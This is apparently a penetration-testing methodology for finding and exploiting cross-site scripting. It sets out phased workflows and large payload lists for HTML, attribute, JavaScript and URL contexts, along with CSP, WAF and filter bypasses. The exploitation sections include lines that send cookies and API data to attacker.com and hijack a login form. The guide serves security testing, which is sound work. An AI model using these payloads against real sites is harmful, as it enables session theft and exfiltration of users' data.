# Methodology

## Core Testing Approach

### 1. What does it do, how does it work?

- **For XSS context**: Understand how user input is processed and rendered
- Identify all input points (forms, URL parameters, headers)
- Trace how data flows from input to output
- Determine if input is stored (database) or immediately reflected
- Analyze when and where user input appears in the page
- Example questions:
    - Is user input reflected immediately or stored for later?
    - Is input rendered in HTML, JavaScript, or attribute context?
    - Are there any visual indications of filtering or sanitization?

### 2. Which technologies are used?

- **For XSS context**: Identify relevant security mechanisms
- Check for Content-Security-Policy headers
- Identify any JavaScript frameworks (React, Angular, Vue)
- Look for WAF signatures or behavior
- Observe sanitization libraries in page source
- Example observations:
    - `Content-Security-Policy: script-src 'self'` blocks inline scripts
    - React automatically escapes variables in JSX
    - Custom sanitization functions visible in source code
    - WAF blocks requests containing `<script>` tags

### 3. Make assumptions/questions based on gathered information

- **For XSS context**: Formulate specific bypass hypotheses
- "What if I use different HTML tags?"
- "What if I try different event handlers?"
- "What if I break out of the current context (quotes, brackets)?"
- "What if I use encoding or obfuscation?"
- Example assumptions:
    - "The application might filter `<script>` but allow `<img>` tags"
    - "Event handlers might be case-sensitive in filtering"
    - "The application might not handle nested tags properly"
    - "Unicode or hex encoding might bypass filters"

### 4. Try to answer assumptions/questions by some tests

- **For XSS context**: Test each assumption systematically
- Start with simple payloads to establish baseline behavior
- Test context-specific payloads based on where input appears
- Document exact behavior for each test
- Compare different vectors for inconsistencies
- Example tests:
    - Basic reflection test: `<h2>test</h2>` - Does HTML render?
    - Script execution test: `<script>alert(1)</script>` - Are script tags filtered?
    - Event handler test: `<img src=x onerror=alert(1)>` - Are events blocked?
    - Context break test: `"><img src=x onerror=alert(1)>` - Can we break out of attributes?

### 5. Sit back & review your results, do some research on similar situations

- **For XSS context**: Analyze patterns in successful/failed tests
- Research filter bypass techniques for identified protections
- Review known vulnerabilities in the technology stack
- Check XSS cheat sheets for similar contexts
- Example analysis:
    - "The application allows `<img>` tags but blocks `onerror` attributes"
    - "Uppercase tags bypass filtering but lowercase are blocked"
    - "The framework sanitizes HTML but JavaScript context is vulnerable"
    - "Similar bypass was documented in CVE-2022-XXXXX for this framework"

### 6. Test those assumptions, do not limit yourself to what is described somewhere!

- **For XSS context**: Try creative bypass techniques
- Combine multiple techniques that individually failed
- Test browser-specific quirks
- Try unconventional tags or attributes
- Create custom encoding chains
- Example advanced tests:
    - Combine case variation with encoding: `<ImG sRc=x OnErRoR=alert(1)>`
    - Try non-standard event handlers: `<div onpointerrawupdate=alert(1)>`
    - Test HTML5 elements: `<svg><animate onbegin=alert(1) attributeName=x>`
    - Use JavaScript template literals: `` onerror=alert`1` ``

### 7. If you see any difference in requests, try to understand why & start over from step 3

- **For XSS context**: Analyze successful vs. blocked payloads
- Identify specific patterns that bypass protection
- Refine your approach based on what works
- Create more targeted payloads for confirmed bypasses
- Repeat the cycle with new assumptions
- Example iteration:
    - Observation: `onmouseover` works but `onerror` is blocked
    - New assumption: The filter has a blacklist of event handlers
    - New test: Try all possible event handlers systematically
    - Result: `onpointerenter` also works, confirming blacklist approach
    - Final payload: `<img src=x onpointerenter=fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))>`

## Practical XSS Testing Workflow

### 1. Discovery Phase

- Map all user input points
    - URL parameters
    - Form fields
    - HTTP headers
    - File uploads
    - JSON/XML data
- Use tracking parameters to identify reflections
    - `xss-tracker` as a unique identifier
    - Filter proxy traffic for this keyword
- Document all reflection points with context

### 2. Context Analysis Phase

- For each reflection point, identify the context:
    - **HTML context**: `<div>user-input</div>`
    - **Attribute context**: `<div id="user-input">`
    - **JavaScript context**: `var data = "user-input";`
    - **CSS context**: `.user-input { color: red; }`
    - **URL context**: `url('user-input')`
- Document specific encoding or filtering observed

### 3. Testing Phase

- For each context, apply specific test payloads:
    - **HTML context tests**:
        
        ```
        <img src=x onerror=alert(1)><svg onload=alert(1)><body onload=alert(1)>
        ```
        
    - **Attribute context tests**:
        
        ```
        " onmouseover="alert(1)" onerror="alert(1)javascript:alert(1)
        ```
        
    - **JavaScript context tests**:
        
        ```
        ';alert(1)//\";alert(1)//</script><img src=x onerror=alert(1)>
        ```
        
- Document exact behavior for each test

### 4. Filter Bypass Phase

- For identified filters, attempt bypasses:
    - **Case variation**: `<iMg sRc=x oNeRrOr=alert(1)>`
    - **Tag obfuscation**: `<img/src="x"/onerror=alert(1)>`
    - **Encoding tricks**: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`
    - **Alternative vectors**: `<svg><animate onbegin=alert(1) attributeName=x>`
    - **Protocol bypasses**: `javascript&#58;alert(1)`
    - **Null bytes**: `<img src=x onerror=alert(1)%00>`
- Document successful bypasses

### 5. Exploitation Phase

- Develop proof-of-concept payloads:
    - Session stealing: `fetch('https://attacker.com/c='+document.cookie)`
    - Data exfiltration: `fetch('/api/user').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal?data='+btoa(JSON.stringify(d))))`
    - DOM manipulation: `document.querySelector('#login-form').action='https://attacker.com/steal'`
- Test impact across different user roles
- Document full attack chains

### 6. Reporting Phase

- Document each vulnerability with:
    - Precise location and context
    - Working payload(s)
    - Reproduction steps
    - Impact assessment
    - Remediation recommendations

## Context-Specific XSS Payloads

### HTML Context Payloads

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe onload=alert(document.domain)>
<video src=x onerror=alert(document.domain)>
<div onmouseover=alert(document.domain)>hover me</div>
<details open ontoggle=alert(document.domain)>
```

### Attribute Context Payloads

```html
" onmouseover="alert(document.domain)
"><img src=x onerror=alert(document.domain)>
" autofocus onfocus="alert(document.domain)
" onclick="alert(document.domain)
javascript:alert(document.domain)
```

### JavaScript Context Payloads

```javascript
';alert(document.domain)//
\";alert(document.domain)//
</script><img src=x onerror=alert(document.domain)>
'-alert(document.domain)-'
\'-alert(document.domain)//
```

### URL Context Payloads

```
javascript:alert(document.domain)
data:text/html,<script>alert(document.domain)</script>
```

## Filter Bypass Techniques

### Tag Filtering Bypasses

- Case variation: `<ScRiPt>alert(1)</sCrIpT>`
- Incomplete tags: `<img src=x onerror=alert(1)`
- Unexpected attributes: `<img/src="x"/onerror=alert(1)>`
- Tag breaking: `<svg></svg><script>alert(1)</script>`
- Null character: `<scr%00ipt>alert(1)</script>`

### Event Handler Bypasses

- Case variation: `ONmouseOVER=alert(1)`
- Obfuscation: `on&#x6d;ouseover=alert(1)`
- Quotes variation: `onmouseover=alert(1) onmouseover='alert(1)' onmouseover="alert(1)"`
- Exotic handlers: `onpointerover, onanimationstart, onanimationiteration`
- Spaces: `onmouseover%09=%09alert(1)`

### JavaScript Code Bypasses

- Function alternatives: `alert(1)` → `eval('al'+'ert(1)')`
- Encoding: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`
- Template literals: `` alert`1` ``
- Unicode escapes: `\u0061\u006c\u0065\u0072\u0074(1)`
- base64: `eval(atob('YWxlcnQoMSk='))`

## Common Protection Mechanisms and Bypasses

### Content Security Policy (CSP) Bypasses

- Misconfigurations: `unsafe-inline`, `unsafe-eval`
- JSONP endpoints: `<script src="/jsonp?callback=alert(1)"></script>`
- DOM clobbering: `<form id=self><input name=innerText value="alert(1)"></form>`
- Angular: `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>`
- iframe sandbox escape: `allow-scripts allow-same-origin`

### WAF/Filter Bypasses

- Multi-encoding: Double URL encoding
- Mixed encoding: Mixing decimal, hex, and HTML entity encoding
- Uncommon syntax: `<img src=x onerror=window['alert'](1)>`
- Splitting vectors: `<img src="x" onerror="a=; setTimeout('lert(1)',0)">`
- Polyglot payloads: `javascript:"/*'/*\/*--><svg onload=alert(1)>//">`

## Testing Tools

- **Burp Suite** - Request interception and modification
- **XSS Hunter** - Blind XSS detection
- **XSSer** - Automated XSS testing
- **DOMPurify Bypass Collection** - Testing sandbox escapes
- **Browser Dev Tools** - DOM inspection and JavaScript debugging